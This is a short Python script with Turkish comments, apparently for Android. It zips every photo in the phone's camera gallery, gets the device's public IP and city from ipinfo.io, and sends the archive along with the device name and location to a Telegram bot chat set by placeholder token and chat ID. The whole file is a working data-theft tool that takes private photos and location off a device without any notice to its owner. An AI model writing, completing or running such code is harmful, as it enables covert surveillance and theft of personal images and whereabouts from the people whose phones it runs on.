import os
import requests
import socket
import zipfile

# Telegram bot bilgileri
TOKEN = 'YOUR BOT TOKEN'  # Bot token
CHAT_ID = 'YOUR CHAT ID'  # Chat ID

# Galeri dizini ve zip dosyası yolu
GALLERY_PATH = '/storage/emulated/0/DCIM/Camera'  # Eski dizin yolu
ZIP_FILE_PATH = '/storage/emulated/0/DCIM/Camera/camera_gallery.zip'  # Oluşturulacak zip dosyası

# Cihaz adı
device_name = socket.gethostname()

# Konum bilgisini almak için örnek API kullanımı
def get_location():
    try:
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        return f"{data['ip']}\n{data['city']}, {data['region']}, {data['country']}"
    except Exception:
        return "Konum bilgisi alınamadı"

# Sistem bilgilerini alma fonksiyonu
def get_system_info():
    return f"Cihaz Adı: {device_name}"

# Zip dosyası oluşturma fonksiyonu
def create_zip():
    print("Zip dosyası oluşturuluyor...")
    with zipfile.ZipFile(ZIP_FILE_PATH, 'w') as zip_file:
        for foldername, subfolders, filenames in os.walk(GALLERY_PATH):
            for filename in filenames:
                file_path = os.path.join(foldername, filename)
                zip_file.write(file_path, os.path.relpath(file_path, GALLERY_PATH))
    print("Zip dosyası oluşturuldu.")

# Zip dosyasını gönderme fonksiyonu
def send_files():
    print("Dosyalar gönderiliyor...")
    try:
        with open(ZIP_FILE_PATH, 'rb') as zip_file:
            location = get_location()
            system_info = get_system_info()

            message_text = (
                f"**İP INFO:**\n{location}\n\n"
                f"**SYSTEM INFO:**\n{system_info}\n\n"
                f"**ARŞİV:**"
            )

            # Cihaz adı ile zip dosyasının adını değiştir
            zip_file_name = f"{device_name}_gallery.zip"

            response_zip = requests.post(
                f'https://api.telegram.org/bot{TOKEN}/sendDocument',
                data={'chat_id': CHAT_ID, 'caption': message_text, 'parse_mode': 'Markdown'},
                files={'document': (zip_file_name, zip_file)}
            )

            if response_zip.status_code == 200:
                print('Zip dosyası başarıyla gönderildi.')
            else:
                print(f'Hata: Zip dosyası gönderilemedi. Durum Kodu: {response_zip.status_code}')

    except Exception as e:
        print(f'Hata oluştu: {e}')

# Ana fonksiyon
def main():
    create_zip()     # Zip dosyasını oluştur
    send_files()     # Dosyaları gönder

# Fonksiyonu çalıştır
if __name__ == '__main__':
    main()